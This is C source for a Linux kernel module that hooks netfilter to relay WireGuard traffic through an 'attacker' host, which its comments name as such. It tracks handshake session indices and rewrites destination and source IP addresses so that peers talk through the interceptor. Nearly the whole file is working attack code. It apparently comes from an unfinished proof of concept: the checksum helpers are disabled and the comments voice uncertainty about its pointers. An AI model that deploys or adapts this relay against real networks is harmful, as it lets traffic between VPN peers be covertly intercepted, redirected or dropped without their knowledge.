#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/vmalloc.h>

// preroute
static struct nf_hook_ops wg_mitm_hook;
// postroute
static struct nf_hook_ops wg_mitm_hook2;
// 
static struct ring_buffer * wg_l_buf;

// figure out the hex for this
char * EXT_IFACE = "192.168.122.60";
uint32_t EXT_IP;

// minimum size for Wireguard packet
// double check this
// cookie repsonse + 8 bytes UDP header
int WG_MIN_SIZE = 40;

struct wghdr {
   uint32_t type;       // 1-4
   uint32_t index1;     // unique session indices, only type 2 
                        //    (handshake response) uses 
   uint32_t index2;     //    both
};

// peer id and associated IP address
struct wg_tuple {
   uint32_t id;
   uint32_t ip_addr;
};

// "peer" is initiator
// "serv" is responder
struct peer_serv_pair {
   struct wg_tuple peer;
   struct wg_tuple serv;
};

struct ring_buffer {
   // use integer overflow instead of 
   //    modulo
   // tail points to end of list, or 
   //    oldest entry in buffer
   //    list[tail - 1] is most recent
   //    entry in buffer
   uint8_t tail;
   struct peer_serv_pair list[256];
};

// allocate memory to store peer associations
struct ring_buffer * make_wg_buf_mem(void) 
{
   // allocate contiguous virtual memory and zero it
   struct ring_buffer * ptr = vzalloc(sizeof(struct ring_buffer));
   pr_info("Allocd memory buffer\n");
   return ptr;
}

// this checksum shit doesn't work.....yet
/*
uint16_t ones_comp_add(uint16_t addend1, uint16_t addend2)
{
   uint32_t sum;
   sum = addend1 + addend2;
   sum = (sum & 0xffff) + (sum >> 16);
   return (uint16_t)(sum + (sum >> 16));
}

// HC' = ~(~HC + ~m + m')
uint16_t incr_cksum(uint16_t sum_old, uint16_t m_old, uint16_t m_new)
{
   uint16_t sum_new = ones_comp_add(~m_old, m_new);
   sum_new = ones_comp_add(~sum_old, sum_new);
   return ~sum_new;
}

uint16_t cksum_addr(uint16_t sum_old, uint32_t ip_old, uint32_t ip_new)
{
   uint16_t sum_new = incr_cksum(sum_old, (uint16_t)(ip_old >> 16), (uint16_t)(ip_new >> 16));
   sum_new = incr_cksum(sum_new, (uint16_t)(ip_old & 0xffff), (uint16_t)(ip_new & 0xffff));
   return sum_new;
}
// */

// helper function, prints IP address to kernel log
void printIP(uint32_t ip)
{
   pr_cont("\t%d.%d.%d.%d\n", 
         (unsigned char) (ip & 0xffff), 
         (unsigned char)((ip >> 8) & 0xffff), 
         (unsigned char)((ip >> 16) & 0xffff), 
         (unsigned char)((ip >> 24) & 0xffff));
   return;
}


/*
 * deallocate memory
 */
void kill_wg_buf_mem(struct ring_buffer * list)
{
   kvfree(list);
   pr_info("freed memory buffer I think.\n");
   return;
}

// find associated peers based on index field
//    return the associated peers by pointer parameter
//    return  0 for matching "peer"
//            1 for matching "serv"
//           -1 for no match
int find_pair(struct ring_buffer * list, uint32_t * idx, struct peer_serv_pair ** pair) 
{
   uint8_t ptr = list->tail - 1;
   while(list->list[ptr].peer.id != 0) {
      if(list->list[ptr].peer.id == *idx) {
         *pair = &(list->list[ptr]);
         //printk(KERN_INFO "memory pointer: %lx\n", pair);
         pr_info("Found peer: %x\n", (*pair)->peer.id);
         //printk(KERN_INFO "Found peer: %x\n", list->list[ptr].peer.id);
         if(pair == NULL) {
            // I can never fucking get pointers right
            pr_info("Fuck my life.\n");
         }
         return 0;
      }
      if(list->list[ptr].serv.id == *idx) {
         pr_info("Found server.\n");
         *pair = &(list->list[ptr]);
         return 1;
      }
      if(ptr == list->tail) {
         break;
      }
      ptr--;
   }
   pr_info("Not found in list.\n");
   *pair = NULL;
   return -1;
}

// add peer to data buffer -- used during first step in handshake
void add_peer(struct ring_buffer * list, uint32_t * id, uint32_t * ip) 
{
   list->list[list->tail].peer.id = *id;
   list->list[list->tail].peer.ip_addr = *ip;
   list->tail++;
   pr_info("Added peer id %x\n", list->list[list->tail - 1].peer.id);
   pr_info("Added peer at %x\n", list->list[list->tail - 1].peer.ip_addr);
}

// add "serv" to data buffer -- used during second step in handshake
struct peer_serv_pair * add_serv(struct ring_buffer * list, uint32_t * p_id, uint32_t * s_id, uint32_t * s_ip) 
{
   struct peer_serv_pair * pair = NULL;
   pr_info("Add server code.\n");
   if(find_pair(list, p_id, &pair) < 0) {
      pr_info("Can't find peer id: %x\n", *p_id);
      return NULL;
   }
   if(pair == NULL) {
      pr_info("fucked up pointer.\n");
      return NULL;
   }
   //return NULL;
   pair->serv.id = *s_id;
   //return NULL;
   pair->serv.ip_addr = *s_ip;
   pr_info("Server id:\t%x\n", *s_id);
   pr_info("At:");
   printIP(*s_ip);
   return pair;
}

// find IP most recently associated with peer when starting 
//    new session, based on data remaining in buffer
//    peers keep trying to start new sessions with the 
//    attacker
uint32_t find_last(struct ring_buffer * list, uint32_t ip)
{
   uint8_t ptr = list->tail - 1;
   while(list->list[ptr].peer.id != 0) {
      if(list->list[ptr].peer.ip_addr == ip) {
         return list->list[ptr].serv.ip_addr;
      } else if(list->list[ptr].serv.ip_addr == ip) {
         return list->list[ptr].peer.ip_addr;
      }
      if(ptr == list->tail) {
         break;
      }
      ptr--;
   }
   return 0;
}

unsigned int wgHandshakeReq(struct iphdr * iph, struct wghdr * wgh) 
{
   struct ring_buffer * list = wg_l_buf;
   // if its trying to start a new session through 
   //    the attacker relay
   if(iph->daddr == EXT_IP) {
      // guess it was the last peer it talked to?
      uint32_t last = find_last(list, iph->saddr);
      pr_info("Guessing last ip.\n");
      if(last != 0) {
         iph->daddr = last;
      } else {
         // drop, force it to try again
         return NF_DROP;
      }
   }
   // peer id == wgh->index1
   add_peer(list, &(wgh->index1), &(iph->saddr));
   pr_info("Accepted handshake initiation.\n");
   return NF_ACCEPT;
}


unsigned int wgHandshakeRes(struct iphdr * iph, struct wghdr * wgh)
{
   struct peer_serv_pair * pair;
   struct ring_buffer * list = wg_l_buf;
   pr_info("WG handshake response.\n");
   // peer id == wgh->index2
   // serv id == wgh->index1
   pair = add_serv(list, &(wgh->index2), &(wgh->index1), &(iph->saddr));
   if(pair == NULL) {
      // didn't record handshake initiation
      //    drop packet and force re-handshake
      pr_info("Peer not known.\n");
      return NF_DROP;
   }//endif
   // change destination IP from attacker IP to 
   //    peer IP
   //    source address will change on postroute hook
   iph->daddr = pair->peer.ip_addr;
   pr_info("Sending response: %x to %x\n", iph->saddr, iph->daddr);
   return NF_ACCEPT;
}

unsigned int wgDataXfer(struct iphdr * iph, struct wghdr * wgh)
{
   struct peer_serv_pair * pair;
   struct ring_buffer * list = wg_l_buf;
   // receiver id == wgh->index1
   // may be peer or server
   struct wg_tuple *src = NULL;
   struct wg_tuple *dst = NULL;
   pr_info("WG data transfer.\n");
   // find in known associations of peers
   int peer = find_pair(list, &(wgh->index1), &pair);
   if(peer == 1) {
      src = &(pair->peer);
      dst = &(pair->serv);
   } else if(peer == 0) {
      src = &(pair->serv);
      dst = &(pair->peer);
   } else {
      pr_info("Can't find session.\n");
      return NF_DROP;
   } //endifelse
   iph->daddr = dst->ip_addr;
   // update source address if roaming
   if(src->ip_addr != iph->saddr) {
      src->ip_addr = iph->saddr;
   }//endif
   return NF_ACCEPT;
}


unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_hook_state * state)
{
   struct iphdr * iph;

   if(!skb) return NF_ACCEPT;

   iph = ip_hdr(skb);
   if(iph->protocol == IPPROTO_UDP) {
      struct udphdr * udph = udp_hdr(skb);
      if(ntohs(udph->len) >= WG_MIN_SIZE) {
         // this is necessary if payload is in paged memory
         struct wghdr wg_type_buf;
         struct wghdr * wgh;
         size_t wg_hdr_offset = (iph->ihl * 4) + sizeof(struct udphdr);
         // this is a tricky function -- see docs
         wgh = skb_header_pointer(skb, wg_hdr_offset, sizeof(struct wghdr), &wg_type_buf);
         if(wgh == NULL) {
            return NF_ACCEPT;
         }
         
         pr_info("Pre Handler run.\n");
         pr_info("Source IP:");
         printIP(iph->saddr);
         pr_info("Dest IP:");
         printIP(iph->daddr);
         pr_info("WG type: %x\n", wgh->type);

         // Ought to be 0x0n 0x00 0x00 0x00 (n 1, 2, 4)
         // Host endianness is least significant byte first
         if((wgh->type <= 4) && (wgh->type > 0)) {
            //printk(KERN_INFO "Found WG packet.\n");
            switch(wgh->type) { 
               // WG handshake step 1
               case 1: 
                  if(wgHandshakeReq(iph, wgh) != NF_ACCEPT) {
                     pr_info("Dropping handshake request packet.\n");
                     return NF_DROP;
                  }
                  break;
               // WG handshake step 2
               case 2: 
                  if(wgHandshakeRes(iph, wgh) != NF_ACCEPT) {
                     pr_info("Dropping handshake response packet.\n");
                     return NF_DROP;
                  }
                  break;
               // WG data transfer
               case 4: 
                  if(wgDataXfer(iph, wgh) != NF_ACCEPT) {
                     pr_info("Dropping Xfer packet.\n");
                     return NF_DROP;
                  }
                  break;
               default: 
                  // case 3, this is not wireguard
                  return NF_ACCEPT;
            }
         }//endif
      }//endif
   }//endif
   // */

   printk(KERN_INFO "Accepting packet with destination IP:");
   printIP(iph->daddr);

   // fix ip checksum if header changed
   iph->check = 0;
   iph->check = ip_fast_csum(iph, iph->ihl);
   //printk(KERN_INFO "Pre handler returns NF_ACCEPT.\n");
   return NF_ACCEPT;
}

  
unsigned int wg_handler_post(void * priv, struct sk_buff * skb, const struct nf_hook_state * state)
{
   struct iphdr * iph;

   pr_info("Post Handler run.\n");
   if(!skb) return NF_ACCEPT;

   iph = ip_hdr(skb);
   if(iph->protocol == IPPROTO_UDP) {
      struct udphdr * udph = udp_hdr(skb);
      if(ntohs(udph->len) >= WG_MIN_SIZE) {
         struct wghdr wg_type_buf;
         struct wghdr * wgh;
         size_t wg_hdr_offset = (iph->ihl * 4) + sizeof(struct udphdr);
         wgh = skb_header_pointer(skb, wg_hdr_offset, sizeof(struct wghdr), &wg_type_buf);
         if(wgh == NULL) {
            return NF_ACCEPT;
         }
         
         pr_info("Post Handler run.\n");
         pr_info("Source IP:");
         printIP(iph->saddr);
         pr_info("Dest IP:");
         printIP(iph->daddr);
         pr_info("WG type: %x\n", wgh->type);

         // Ought to be 0x0n 0x00 0x00 0x00 (n 1, 2, 4)
         // Host endianness is least significant byte first
         if((wgh->type <= 4) && (wgh->type > 0)) {
            // this case is not actually wireguard
            if(wgh->type == 3) return NF_ACCEPT;
            //printk(KERN_INFO "Found WG packet.\n");
            // change source address to attacker and 
            //    fix IP checksum
            iph->saddr = EXT_IP;
            iph->check = 0;
            iph->check = ip_fast_csum(iph, iph->ihl);
         }
      }//endif
   }//endif

  return NF_ACCEPT;
}

int register_filter(void)
{  
   pr_info("Loading Module.\n");

   // allocate memory
   wg_l_buf = make_wg_buf_mem();

   wg_mitm_hook.hook = wg_handler_pre;
   wg_mitm_hook.hooknum = NF_INET_PRE_ROUTING;
   wg_mitm_hook.pf = PF_INET;
   wg_mitm_hook.priority = NF_IP_PRI_FIRST;
   nf_register_net_hook(&init_net, &wg_mitm_hook);

   wg_mitm_hook2.hook = wg_handler_post;
   wg_mitm_hook2.hooknum = NF_INET_POST_ROUTING;
   wg_mitm_hook2.pf = PF_INET;
   wg_mitm_hook2.priority = NF_IP_PRI_FIRST;
   nf_register_net_hook(&init_net, &wg_mitm_hook2);

   EXT_IP = in_aton(EXT_IFACE);

   return 0;
}

void remove_filter(void)
{
   pr_info("Killing module.\n");
   nf_unregister_net_hook(&init_net, &wg_mitm_hook);

   nf_unregister_net_hook(&init_net, &wg_mitm_hook2);
   // deallocate memory
   kill_wg_buf_mem(wg_l_buf);
   return;
}

module_init(register_filter);
module_exit(remove_filter);

MODULE_LICENSE("GPL");
